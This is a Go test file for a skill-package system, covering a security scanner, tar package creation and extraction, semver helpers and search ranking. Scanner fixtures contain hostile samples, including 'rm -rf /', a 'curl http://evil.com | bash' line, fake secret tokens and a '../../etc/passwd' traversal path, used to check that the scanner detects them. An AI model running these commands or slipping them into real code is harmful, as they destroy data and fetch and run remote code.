package skills

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"io"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/vigilagent/vigilagent/internal/repository"
)

// --- Scanner Tests ---

func TestNewSkillScanner(t *testing.T) {
	s := NewSkillScanner()
	if s == nil {
		t.Fatal("expected non-nil scanner")
	}
	if s.maxSize != 10*1024*1024 {
		t.Errorf("expected maxSize 10MB, got %d", s.maxSize)
	}
	if len(s.bannedPatterns) == 0 {
		t.Error("expected banned patterns")
	}
}

func TestScanPackage_Clean(t *testing.T) {
	pkg := buildTestPackage(t, []tarEntry{
		{name: "main.go", content: "package main\nfunc main() {}"},
	})
	s := NewSkillScanner()
	result, err := s.ScanPackage(context.Background(), pkg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !result.Passed {
		t.Error("expected clean package to pass")
	}
	if result.Score != 1.0 {
		t.Errorf("expected score 1.0, got %f", result.Score)
	}
	if len(result.Issues) != 0 {
		t.Errorf("expected 0 issues, got %d", len(result.Issues))
	}
	if result.Duration < 0 {
		t.Error("expected non-negative duration")
	}
}

func TestScanPackage_TooLarge(t *testing.T) {
	s := NewSkillScanner()
	bigData := bytes.Repeat([]byte("x"), 11*1024*1024)
	result, err := s.ScanPackage(context.Background(), bigData)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.Passed {
		t.Error("expected oversized package to fail")
	}
	if result.Score != 0 {
		t.Errorf("expected score 0, got %f", result.Score)
	}
	if len(result.Issues) != 1 {
		t.Fatalf("expected 1 issue, got %d", len(result.Issues))
	}
	if result.Issues[0].Severity != "critical" {
		t.Errorf("expected critical severity, got %q", result.Issues[0].Severity)
	}
	if result.Issues[0].Category != "size" {
		t.Errorf("expected size category, got %q", result.Issues[0].Category)
	}
}

func TestScanPackage_InvalidGzip(t *testing.T) {
	s := NewSkillScanner()
	_, err := s.ScanPackage(context.Background(), []byte("not gzip at all"))
	if err == nil {
		t.Error("expected error for invalid gzip")
	}
}

func TestScanPackage_DangerousPatterns(t *testing.T) {
	pkg := buildTestPackage(t, []tarEntry{
		{name: "hack.go", content: "os.exec(\"rm -rf /\")\n"},
	})
	s := NewSkillScanner()
	result, err := s.ScanPackage(context.Background(), pkg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(result.Issues) == 0 {
		t.Error("expected security issues")
	}
	found := false
	for _, issue := range result.Issues {
		if issue.Category == "security_pattern" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected security_pattern issue")
	}
}

func TestScanPackage_SecretDetection(t *testing.T) {
	pkg := buildTestPackage(t, []tarEntry{
		{name: "config.go", content: "apiKey := \"sk-abcdefghijklmnopqrstuvwx\"\n"},
	})
	s := NewSkillScanner()
	result, err := s.ScanPackage(context.Background(), pkg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	found := false
	for _, issue := range result.Issues {
		if issue.Category == "secrets" {
			found = true
			if issue.Severity != "critical" {
				t.Errorf("expected critical severity for secrets, got %q", issue.Severity)
			}
		}
	}
	if !found {
		t.Error("expected secrets issue")
	}
}

func TestScanPackage_GitHubPAT(t *testing.T) {
	pkg := buildTestPackage(t, []tarEntry{
		{name: "config.go", content: "token := \"ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef1234\"\n"},
	})
	s := NewSkillScanner()
	result, err := s.ScanPackage(context.Background(), pkg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	found := false
	for _, issue := range result.Issues {
		if issue.Category == "secrets" {
			found = true
		}
	}
	if !found {
		t.Error("expected secrets issue for GitHub PAT")
	}
}

func TestScanPackage_SlackToken(t *testing.T) {
	pkg := buildTestPackage(t, []tarEntry{
		{name: "config.go", content: "token := \"xoxb-1234567890-abcdef-ghijklmnop\"\n"},
	})
	s := NewSkillScanner()
	result, err := s.ScanPackage(context.Background(), pkg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	found := false
	for _, issue := range result.Issues {
		if issue.Category == "secrets" {
			found = true
		}
	}
	if !found {
		t.Error("expected secrets issue for Slack token")
	}
}

func TestScanPackage_ManifestSeverity(t *testing.T) {
	pkg := buildTestPackage(t, []tarEntry{
		{name: "manifest.json", content: "os.exec(\"calc.exe\")\n"},
	})
	s := NewSkillScanner()
	result, err := s.ScanPackage(context.Background(), pkg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(result.Issues) == 0 {
		t.Fatal("expected issues")
	}
	for _, issue := range result.Issues {
		if issue.File == "manifest.json" && issue.Severity != "high" {
			t.Errorf("manifest file should have high severity, got %q", issue.Severity)
		}
	}
}

func TestScanPackage_ScoreDegrades(t *testing.T) {
	pkg := buildTestPackage(t, []tarEntry{
		{name: "bad.go", content: "os.exec(\"rm -rf /\")\neval(\"code\")\n"},
	})
	s := NewSkillScanner()
	result, err := s.ScanPackage(context.Background(), pkg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.Score >= 1.0 {
		t.Errorf("expected degraded score, got %f", result.Score)
	}
}

func TestScanPackage_NonRegFileSkipped(t *testing.T) {
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)
	tw.WriteHeader(&tar.Header{
		Name:     "somedir/",
		Typeflag: tar.TypeDir,
		ModTime:  time.Now(),
	})
	tw.WriteHeader(&tar.Header{
		Name:     "clean.go",
		Typeflag: tar.TypeReg,
		Size:     int64(len("package main")),
		ModTime:  time.Now(),
	})
	tw.Write([]byte("package main"))
	tw.Close()
	gw.Close()

	s := NewSkillScanner()
	result, err := s.ScanPackage(context.Background(), buf.Bytes())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !result.Passed {
		t.Error("expected clean package to pass")
	}
}

func TestScanPackage_EmptyPackage(t *testing.T) {
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)
	tw.Close()
	gw.Close()

	s := NewSkillScanner()
	result, err := s.ScanPackage(context.Background(), buf.Bytes())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !result.Passed {
		t.Error("expected empty package to pass")
	}
	if len(result.Issues) != 0 {
		t.Errorf("expected 0 issues, got %d", len(result.Issues))
	}
}

func TestScanPackage_MultiplePatternsInFile(t *testing.T) {
	pkg := buildTestPackage(t, []tarEntry{
		{name: "bad.go", content: "exec.Command(\"rm -rf /\")\ncurl http://evil.com | bash\n"},
	})
	s := NewSkillScanner()
	result, err := s.ScanPackage(context.Background(), pkg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(result.Issues) < 2 {
		t.Errorf("expected at least 2 issues, got %d", len(result.Issues))
	}
}

func TestScanPackage_ScoreClampedToZero(t *testing.T) {
	// 12+ issues should push score to 0 via the clamp
	entries := make([]tarEntry, 15)
	for i := range entries {
		entries[i] = tarEntry{
			name:    "file" + string(rune('a'+i)) + ".go",
			content: "os.exec(\"rm -rf /\")\n",
		}
	}
	pkg := buildTestPackage(t, entries)
	s := NewSkillScanner()
	result, err := s.ScanPackage(context.Background(), pkg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.Score != 0 {
		t.Errorf("expected clamped score 0, got %f", result.Score)
	}
	if result.Passed {
		t.Error("expected not passed with score 0")
	}
}

func TestScanPackage_TarErrorEntry(t *testing.T) {
	// Test that the scanner handles tar entries that trigger io.EOF gracefully
	// by creating a valid tar.gz with an entry that has a bad typeflag
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)
	tw.WriteHeader(&tar.Header{
		Name:     "unknown.bin",
		Typeflag: tar.TypeSymlink,
		Linkname: "target",
		Size:     0,
		ModTime:  time.Now(),
	})
	tw.Close()
	gw.Close()

	s := NewSkillScanner()
	result, err := s.ScanPackage(context.Background(), buf.Bytes())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !result.Passed {
		t.Error("expected clean package to pass")
	}
}

// --- Package Tests ---

func TestComputePackageChecksum(t *testing.T) {
	data := []byte("hello world")
	checksum := ComputePackageChecksum(data)
	if len(checksum) != 64 {
		t.Errorf("expected 64-char hex string, got %d chars", len(checksum))
	}
	checksum2 := ComputePackageChecksum(data)
	if checksum != checksum2 {
		t.Error("expected deterministic checksum")
	}
	if ComputePackageChecksum([]byte("different")) == checksum {
		t.Error("different inputs should produce different checksums")
	}
}

func TestParseSemver(t *testing.T) {
	tests := []struct {
		input string
		major int
		minor int
		patch int
		err   bool
	}{
		{"1.2.3", 1, 2, 3, false},
		{"v1.2.3", 1, 2, 3, false},
		{"0.0.0", 0, 0, 0, false},
		{"10.20.30", 10, 20, 30, false},
		{"1.2.3-alpha", 1, 2, 3, false},
		{"1.2.3-beta.1", 1, 2, 3, false},
		{"1.2.3+build.123", 1, 2, 3, false},
		{"1.2.3-alpha.1+build.456", 1, 2, 3, false},
		{"invalid", 0, 0, 0, true},
		{"1.2", 0, 0, 0, true},
		{"1.2.3.4", 0, 0, 0, true},
		{"", 0, 0, 0, true},
		{"a.b.c", 0, 0, 0, true},
	}
	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			sv, err := ParseSemver(tt.input)
			if tt.err {
				if err == nil {
					t.Errorf("expected error for %q", tt.input)
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error for %q: %v", tt.input, err)
			}
			if sv.Major != tt.major || sv.Minor != tt.minor || sv.Patch != tt.patch {
				t.Errorf("got %d.%d.%d, want %d.%d.%d", sv.Major, sv.Minor, sv.Patch, tt.major, tt.minor, tt.patch)
			}
		})
	}
}

func TestSemverString(t *testing.T) {
	sv := Semver{Major: 1, Minor: 2, Patch: 3}
	if got := sv.String(); got != "1.2.3" {
		t.Errorf("got %q, want %q", got, "1.2.3")
	}
}

func TestSemverCompare(t *testing.T) {
	tests := []struct {
		a, b Semver
		want int
	}{
		{Semver{1, 0, 0}, Semver{1, 0, 0}, 0},
		{Semver{1, 0, 0}, Semver{2, 0, 0}, -1},
		{Semver{2, 0, 0}, Semver{1, 0, 0}, 1},
		{Semver{1, 1, 0}, Semver{1, 2, 0}, -1},
		{Semver{1, 2, 0}, Semver{1, 1, 0}, 1},
		{Semver{1, 2, 3}, Semver{1, 2, 4}, -1},
		{Semver{1, 2, 4}, Semver{1, 2, 3}, 1},
		{Semver{1, 2, 3}, Semver{1, 2, 3}, 0},
	}
	for _, tt := range tests {
		got := tt.a.Compare(tt.b)
		if got != tt.want {
			t.Errorf("%v.Compare(%v) = %d, want %d", tt.a, tt.b, got, tt.want)
		}
	}
}

func TestSemverIsCompatible(t *testing.T) {
	a := Semver{Major: 1, Minor: 2, Patch: 3}
	if !a.IsCompatible(Semver{Major: 1, Minor: 9, Patch: 9}) {
		t.Error("same major should be compatible")
	}
	if a.IsCompatible(Semver{Major: 2, Minor: 0, Patch: 0}) {
		t.Error("different major should not be compatible")
	}
}

func TestSemverNextMajor(t *testing.T) {
	got := Semver{1, 2, 3}.NextMajor()
	want := Semver{2, 0, 0}
	if got != want {
		t.Errorf("got %v, want %v", got, want)
	}
}

func TestSemverNextMinor(t *testing.T) {
	got := Semver{1, 2, 3}.NextMinor()
	want := Semver{1, 3, 0}
	if got != want {
		t.Errorf("got %v, want %v", got, want)
	}
}

func TestSemverNextPatch(t *testing.T) {
	got := Semver{1, 2, 3}.NextPatch()
	want := Semver{1, 2, 4}
	if got != want {
		t.Errorf("got %v, want %v", got, want)
	}
}

func TestValidateVersion(t *testing.T) {
	if err := ValidateVersion("1.2.3"); err != nil {
		t.Errorf("expected valid, got %v", err)
	}
	if err := ValidateVersion("bad"); err == nil {
		t.Error("expected error for invalid version")
	}
}

func TestIsNewerVersion(t *testing.T) {
	tests := []struct {
		current, new string
		want         bool
		err          bool
	}{
		{"1.0.0", "2.0.0", true, false},
		{"2.0.0", "1.0.0", false, false},
		{"1.0.0", "1.0.0", false, false},
		{"1.2.3", "1.3.0", true, false},
		{"bad", "1.0.0", false, true},
		{"1.0.0", "bad", false, true},
	}
	for _, tt := range tests {
		t.Run(tt.current+"->"+tt.new, func(t *testing.T) {
			got, err := IsNewerVersion(tt.current, tt.new)
			if tt.err {
				if err == nil {
					t.Error("expected error")
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if got != tt.want {
				t.Errorf("got %v, want %v", got, tt.want)
			}
		})
	}
}

func TestGetLatestVersion(t *testing.T) {
	versions := []string{"1.0.0", "3.0.0", "2.0.0"}
	got, err := GetLatestVersion(versions)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if got != "3.0.0" {
		t.Errorf("got %q, want %q", got, "3.0.0")
	}

	_, err = GetLatestVersion(nil)
	if err == nil {
		t.Error("expected error for empty list")
	}

	versions = []string{"1.0.0", "bad", "2.0.0"}
	got, err = GetLatestVersion(versions)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if got != "2.0.0" {
		t.Errorf("got %q, want %q", got, "2.0.0")
	}

	got, err = GetLatestVersion([]string{"5.0.0"})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if got != "5.0.0" {
		t.Errorf("got %q, want %q", got, "5.0.0")
	}

	// All invalid
	_, err = GetLatestVersion([]string{"bad", "also-bad"})
	if err == nil {
		t.Error("expected error for all-invalid versions")
	}
}

func TestFilterCompatibleVersions(t *testing.T) {
	versions := []string{"1.0.0", "2.0.0", "1.5.0", "2.1.0", "bad"}
	got := FilterCompatibleVersions(versions, "1.0.0")
	if len(got) != 2 {
		t.Errorf("expected 2 compatible versions, got %d: %v", len(got), got)
	}
	for _, v := range got {
		sv, _ := ParseSemver(v)
		if sv.Major != 1 {
			t.Errorf("expected major 1, got %v", sv)
		}
	}

	got = FilterCompatibleVersions(versions, "bad")
	if got != nil {
		t.Errorf("expected nil for invalid target, got %v", got)
	}

	// Empty versions
	got = FilterCompatibleVersions(nil, "1.0.0")
	if len(got) != 0 {
		t.Errorf("expected empty, got %v", got)
	}
}

func TestSortVersions(t *testing.T) {
	versions := []string{"1.0.0", "3.0.0", "2.0.0", "bad", "2.5.0"}
	got := SortVersions(versions)
	if len(got) != 4 {
		t.Errorf("expected 4 versions, got %d", len(got))
	}
	if got[0] != "3.0.0" || got[1] != "2.5.0" || got[2] != "2.0.0" || got[3] != "1.0.0" {
		t.Errorf("unexpected order: %v", got)
	}

	got = SortVersions(nil)
	if len(got) != 0 {
		t.Errorf("expected empty, got %v", got)
	}

	got = SortVersions([]string{"1.0.0"})
	if len(got) != 1 || got[0] != "1.0.0" {
		t.Errorf("unexpected: %v", got)
	}

	// Already sorted
	got = SortVersions([]string{"3.0.0", "2.0.0", "1.0.0"})
	if len(got) != 3 || got[0] != "3.0.0" || got[1] != "2.0.0" || got[2] != "1.0.0" {
		t.Errorf("unexpected: %v", got)
	}
}

func TestCreateAndExtractPackage(t *testing.T) {
	skillDir := t.TempDir()
	os.WriteFile(filepath.Join(skillDir, "main.go"), []byte("package main"), 0644)
	os.WriteFile(filepath.Join(skillDir, ".hidden"), []byte("hidden"), 0644)
	os.WriteFile(filepath.Join(skillDir, "foo_test.go"), []byte("test"), 0644)

	manifest := &Manifest{
		Name:        "test-skill",
		Version:     "1.0.0",
		Description: "test",
		Category:    "test",
		EntryPoint:  "main.go",
	}

	data, err := CreatePackage(skillDir, manifest)
	if err != nil {
		t.Fatalf("CreatePackage failed: %v", err)
	}
	if len(data) == 0 {
		t.Fatal("expected non-empty package data")
	}

	checksum := ComputePackageChecksum(data)
	if len(checksum) != 64 {
		t.Errorf("expected 64-char checksum, got %d", len(checksum))
	}

	extractDir := t.TempDir()
	gotManifest, err := ExtractPackage(data, extractDir)
	if err != nil {
		t.Fatalf("ExtractPackage failed: %v", err)
	}
	if gotManifest == nil {
		t.Fatal("expected non-nil manifest")
	}
	if gotManifest.Name != "test-skill" {
		t.Errorf("expected name 'test-skill', got %q", gotManifest.Name)
	}

	extracted, err := os.ReadFile(filepath.Join(extractDir, "main.go"))
	if err != nil {
		t.Fatalf("failed to read extracted file: %v", err)
	}
	if string(extracted) != "package main" {
		t.Errorf("extracted content mismatch: %q", string(extracted))
	}

	_, err = os.Stat(filepath.Join(extractDir, ".hidden"))
	if err == nil {
		t.Error("hidden file should not be extracted")
	}
	_, err = os.Stat(filepath.Join(extractDir, "foo_test.go"))
	if err == nil {
		t.Error("test file should not be extracted")
	}
}

func TestCreatePackage_Subdirectories(t *testing.T) {
	skillDir := t.TempDir()
	os.MkdirAll(filepath.Join(skillDir, "sub", "nested"), 0755)
	os.WriteFile(filepath.Join(skillDir, "main.go"), []byte("package main"), 0644)
	os.WriteFile(filepath.Join(skillDir, "sub", "helper.go"), []byte("package sub"), 0644)
	os.WriteFile(filepath.Join(skillDir, "sub", "nested", "deep.go"), []byte("package nested"), 0644)

	manifest := &Manifest{
		Name:       "sub-skill",
		Version:    "1.0.0",
		Category:   "test",
		EntryPoint: "main.go",
	}

	data, err := CreatePackage(skillDir, manifest)
	if err != nil {
		t.Fatalf("CreatePackage failed: %v", err)
	}
	if len(data) == 0 {
		t.Fatal("expected non-empty package")
	}

	extractDir := t.TempDir()
	ExtractPackage(data, extractDir)

	for _, f := range []string{"main.go", "sub/helper.go", "sub/nested/deep.go"} {
		if _, err := os.Stat(filepath.Join(extractDir, f)); err != nil {
			t.Errorf("expected file %s to exist", f)
		}
	}
}

func TestCreatePackage_EmptyDir(t *testing.T) {
	skillDir := t.TempDir()
	manifest := &Manifest{Name: "empty", Version: "1.0.0", Category: "test"}
	data, err := CreatePackage(skillDir, manifest)
	if err != nil {
		t.Fatalf("CreatePackage failed: %v", err)
	}
	if len(data) == 0 {
		t.Fatal("expected non-empty package even for empty dir")
	}
}

func TestExtractPackage_Subdirectories(t *testing.T) {
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)

	tw.WriteHeader(&tar.Header{
		Name:     "subdir/",
		Typeflag: tar.TypeDir,
		Mode:     0755,
		ModTime:  time.Now(),
	})
	content := []byte("package nested")
	tw.WriteHeader(&tar.Header{
		Name:     "subdir/helper.go",
		Typeflag: tar.TypeReg,
		Mode:     0644,
		Size:     int64(len(content)),
		ModTime:  time.Now(),
	})
	tw.Write(content)

	manifestContent := []byte(`{"name":"sub-skill","version":"1.0.0","category":"test"}`)
	tw.WriteHeader(&tar.Header{
		Name:     "manifest.json",
		Typeflag: tar.TypeReg,
		Mode:     0644,
		Size:     int64(len(manifestContent)),
		ModTime:  time.Now(),
	})
	tw.Write(manifestContent)

	tw.Close()
	gw.Close()

	extractDir := t.TempDir()
	manifest, err := ExtractPackage(buf.Bytes(), extractDir)
	if err != nil {
		t.Fatalf("ExtractPackage failed: %v", err)
	}
	if manifest == nil {
		t.Fatal("expected non-nil manifest")
	}
	if _, err := os.Stat(filepath.Join(extractDir, "subdir")); err != nil {
		t.Error("expected subdirectory to exist")
	}
	if _, err := os.Stat(filepath.Join(extractDir, "subdir", "helper.go")); err != nil {
		t.Error("expected file in subdirectory")
	}
}

func TestExtractPackage_InvalidGzip(t *testing.T) {
	_, err := ExtractPackage([]byte("not gzip"), t.TempDir())
	if err == nil {
		t.Error("expected error for invalid gzip data")
	}
}

func TestExtractPackage_DirectoryTraversal(t *testing.T) {
	var buf = newTestTarGz(t, []tarEntry{
		{name: "../../etc/passwd", content: "pwned", typeflag: tar.TypeReg},
	})

	extractDir := t.TempDir()
	manifest, err := ExtractPackage(buf.Bytes(), extractDir)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if manifest != nil {
		t.Error("expected nil manifest for traversal package")
	}
}

func TestExtractPackage_Empty(t *testing.T) {
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)
	tw.Close()
	gw.Close()

	extractDir := t.TempDir()
	manifest, err := ExtractPackage(buf.Bytes(), extractDir)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if manifest != nil {
		t.Error("expected nil manifest for empty package")
	}
}

func TestExtractPackage_InvalidManifest(t *testing.T) {
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)
	content := []byte(`{invalid json`)
	tw.WriteHeader(&tar.Header{
		Name:     "manifest.json",
		Typeflag: tar.TypeReg,
		Mode:     0644,
		Size:     int64(len(content)),
		ModTime:  time.Now(),
	})
	tw.Write(content)
	tw.Close()
	gw.Close()

	extractDir := t.TempDir()
	manifest, err := ExtractPackage(buf.Bytes(), extractDir)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if manifest != nil && manifest.Name != "" {
		t.Error("expected empty/nil manifest for invalid JSON")
	}
}

func TestExtractPackage_NoManifest(t *testing.T) {
	// Package with only a regular file, no manifest.json
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)
	content := []byte("package main")
	tw.WriteHeader(&tar.Header{
		Name:     "main.go",
		Typeflag: tar.TypeReg,
		Mode:     0644,
		Size:     int64(len(content)),
		ModTime:  time.Now(),
	})
	tw.Write(content)
	tw.Close()
	gw.Close()

	extractDir := t.TempDir()
	manifest, err := ExtractPackage(buf.Bytes(), extractDir)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if manifest != nil {
		t.Error("expected nil manifest when no manifest.json in package")
	}
}

func TestExtractPackage_MultipleFiles(t *testing.T) {
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)

	files := map[string]string{
		"a.go":  "package a",
		"b.go":  "package b",
		"c.txt": "hello",
	}
	for name, content := range files {
		data := []byte(content)
		tw.WriteHeader(&tar.Header{
			Name:     name,
			Typeflag: tar.TypeReg,
			Mode:     0644,
			Size:     int64(len(data)),
			ModTime:  time.Now(),
		})
		tw.Write(data)
	}
	tw.Close()
	gw.Close()

	extractDir := t.TempDir()
	_, err := ExtractPackage(buf.Bytes(), extractDir)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	for name, expected := range files {
		data, err := os.ReadFile(filepath.Join(extractDir, name))
		if err != nil {
			t.Errorf("file %s not extracted: %v", name, err)
			continue
		}
		if string(data) != expected {
			t.Errorf("file %s content mismatch: got %q, want %q", name, string(data), expected)
		}
	}
}

// --- RAG Pure Function Tests ---

func TestExpandQuery(t *testing.T) {
	r := &RAGEngine{}
	tests := []struct {
		query string
		min   int
	}{
		{"auth", 2},
		{"validate", 2},
		{"scan", 2},
		{"security", 2},
		{"error", 2},
		{"config", 2},
		{"test", 2},
		{"deploy", 2},
		{"monitor", 2},
		{"cache", 2},
		{"xyz", 1},
		{"a I go to", 1},
		{"hello world", 1},
	}
	for _, tt := range tests {
		t.Run(tt.query, func(t *testing.T) {
			got := r.expandQuery(tt.query)
			if len(got) < tt.min {
				t.Errorf("expandQuery(%q) returned %d results, want >= %d: %v", tt.query, len(got), tt.min, got)
			}
			if got[0] != tt.query {
				t.Errorf("first result should be original query, got %q", got[0])
			}
		})
	}
}

func TestExpandQuery_AuthMultiWord(t *testing.T) {
	r := &RAGEngine{}
	expanded := r.expandQuery("fix auth bug")
	if len(expanded) <= 1 {
		t.Error("expected multiple expanded queries for multi-word input")
	}
}

func TestBuildTsQuery(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"hello world", "hello:* & world:*"},
		{"it's a test", "its:* & a:* & test:*"},
		{"foo:bar", "foobar:*"},
		{"single", "single:*"},
		{"", ""},
		{"hello world foo", "hello:* & world:* & foo:*"},
	}
	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			got := buildTsQuery(tt.input)
			if got != tt.want {
				t.Errorf("buildTsQuery(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestReciprocalRankFusion(t *testing.T) {
	r := &RAGEngine{}
	k := 60.0

	vectorResults := []scoredResult{
		{skill: repository.Skill{ID: "a", Name: "skill-a"}},
		{skill: repository.Skill{ID: "b", Name: "skill-b"}},
	}
	bm25Results := []scoredResult{
		{skill: repository.Skill{ID: "b", Name: "skill-b"}},
		{skill: repository.Skill{ID: "c", Name: "skill-c"}},
	}

	merged := r.reciprocalRankFusion(vectorResults, bm25Results)
	if len(merged) != 3 {
		t.Fatalf("expected 3 merged results, got %d", len(merged))
	}

	for _, sr := range merged {
		switch sr.skill.ID {
		case "a":
			if sr.vectorScore != 1.0/(k+1) {
				t.Errorf("expected vectorScore 1/(60+1) for a, got %f", sr.vectorScore)
			}
			if sr.bm25Score != 0 {
				t.Errorf("expected bm25Score 0 for a, got %f", sr.bm25Score)
			}
		case "b":
			if sr.vectorScore != 1.0/(k+2) {
				t.Errorf("expected vectorScore 1/(60+2) for b, got %f", sr.vectorScore)
			}
			if sr.bm25Score != 1.0/(k+1) {
				t.Errorf("expected bm25Score 1/(60+1) for b, got %f", sr.bm25Score)
			}
		case "c":
			if sr.vectorScore != 0 {
				t.Errorf("expected vectorScore 0 for c, got %f", sr.vectorScore)
			}
			if sr.bm25Score != 1.0/(k+2) {
				t.Errorf("expected bm25Score 1/(60+2) for c, got %f", sr.bm25Score)
			}
		}
		expectedScore := sr.vectorScore + sr.bm25Score
		if sr.score != expectedScore {
			t.Errorf("expected score %f, got %f for %s", expectedScore, sr.score, sr.skill.ID)
		}
	}
}

func TestReciprocalRankFusion_Empty(t *testing.T) {
	r := &RAGEngine{}
	merged := r.reciprocalRankFusion(nil, nil)
	if len(merged) != 0 {
		t.Errorf("expected empty, got %d", len(merged))
	}
}

func TestReciprocalRankFusion_Overlap(t *testing.T) {
	r := &RAGEngine{}
	results := []scoredResult{
		{skill: repository.Skill{ID: "a", Name: "skill-a"}},
	}
	merged := r.reciprocalRankFusion(results, results)
	if len(merged) != 1 {
		t.Fatalf("expected 1 merged result, got %d", len(merged))
	}
}

func TestReciprocalRankFusion_OnlyVector(t *testing.T) {
	r := &RAGEngine{}
	vectorResults := []scoredResult{
		{skill: repository.Skill{ID: "a", Name: "skill-a"}},
		{skill: repository.Skill{ID: "b", Name: "skill-b"}},
	}
	merged := r.reciprocalRankFusion(vectorResults, nil)
	if len(merged) != 2 {
		t.Fatalf("expected 2, got %d", len(merged))
	}
}

func TestReciprocalRankFusion_OnlyBM25(t *testing.T) {
	r := &RAGEngine{}
	bm25Results := []scoredResult{
		{skill: repository.Skill{ID: "a", Name: "skill-a"}},
	}
	merged := r.reciprocalRankFusion(nil, bm25Results)
	if len(merged) != 1 {
		t.Fatalf("expected 1, got %d", len(merged))
	}
}

func TestRerankByMetadata(t *testing.T) {
	r := &RAGEngine{}
	now := time.Now()

	results := []scoredResult{
		{
			skill:       repository.Skill{ID: "a", Downloads: 100, Rating: 5.0, IsVerified: true, UpdatedAt: now},
			score:       0.5,
			vectorScore: 0.3,
			bm25Score:   0.2,
		},
		{
			skill:       repository.Skill{ID: "b", Downloads: 50, Rating: 3.0, IsVerified: false, UpdatedAt: now.Add(-48 * time.Hour)},
			score:       0.4,
			vectorScore: 0.1,
			bm25Score:   0.1,
		},
	}

	reranked := r.rerankByMetadata(results)
	if len(reranked) != 2 {
		t.Fatalf("expected 2 results, got %d", len(reranked))
	}
	if reranked[0].skill.ID != "a" {
		t.Errorf("expected skill-a first, got skill-%s", reranked[0].skill.ID)
	}
	for _, sr := range reranked {
		if sr.metaScore == 0 {
			t.Errorf("expected non-zero metaScore for skill-%s", sr.skill.ID)
		}
	}
}

func TestRerankByMetadata_Empty(t *testing.T) {
	r := &RAGEngine{}
	reranked := r.rerankByMetadata(nil)
	if len(reranked) != 0 {
		t.Errorf("expected empty, got %d", len(reranked))
	}
}

func TestRerankByMetadata_SingleResult(t *testing.T) {
	r := &RAGEngine{}
	results := []scoredResult{
		{
			skill:       repository.Skill{ID: "a", Downloads: 10, Rating: 4.0, IsVerified: false, UpdatedAt: time.Now()},
			score:       0.5,
			vectorScore: 0.3,
			bm25Score:   0.2,
		},
	}
	reranked := r.rerankByMetadata(results)
	if len(reranked) != 1 {
		t.Fatalf("expected 1 result, got %d", len(reranked))
	}
	if reranked[0].metaScore == 0 {
		t.Error("expected non-zero metaScore")
	}
}

func TestRerankByMetadata_ZeroUpdatedAt(t *testing.T) {
	r := &RAGEngine{}
	results := []scoredResult{
		{
			skill:       repository.Skill{ID: "a", Downloads: 10, Rating: 4.0, IsVerified: false},
			score:       0.5,
			vectorScore: 0.3,
			bm25Score:   0.2,
		},
	}
	reranked := r.rerankByMetadata(results)
	if len(reranked) != 1 {
		t.Fatalf("expected 1 result, got %d", len(reranked))
	}
	if reranked[0].metaScore == 0 {
		t.Error("expected non-zero metaScore even with zero UpdatedAt")
	}
}

func TestRerankByMetadata_RecencyBonuses(t *testing.T) {
	r := &RAGEngine{}

	recent := time.Now()
	middle := time.Now().Add(-10 * 24 * time.Hour)
	old := time.Now().Add(-40 * 24 * time.Hour)

	results := []scoredResult{
		{skill: repository.Skill{ID: "old", Downloads: 100, Rating: 5.0, UpdatedAt: old}, score: 0.5, vectorScore: 0.3, bm25Score: 0.2},
		{skill: repository.Skill{ID: "mid", Downloads: 100, Rating: 5.0, UpdatedAt: middle}, score: 0.5, vectorScore: 0.3, bm25Score: 0.2},
		{skill: repository.Skill{ID: "new", Downloads: 100, Rating: 5.0, UpdatedAt: recent}, score: 0.5, vectorScore: 0.3, bm25Score: 0.2},
	}

	reranked := r.rerankByMetadata(results)
	scores := map[string]float64{}
	for _, sr := range reranked {
		scores[sr.skill.ID] = sr.metaScore
	}
	if scores["new"] <= scores["mid"] {
		t.Errorf("expected new > mid: %f > %f", scores["new"], scores["mid"])
	}
	if scores["mid"] <= scores["old"] {
		t.Errorf("expected mid > old: %f > %f", scores["mid"], scores["old"])
	}
}

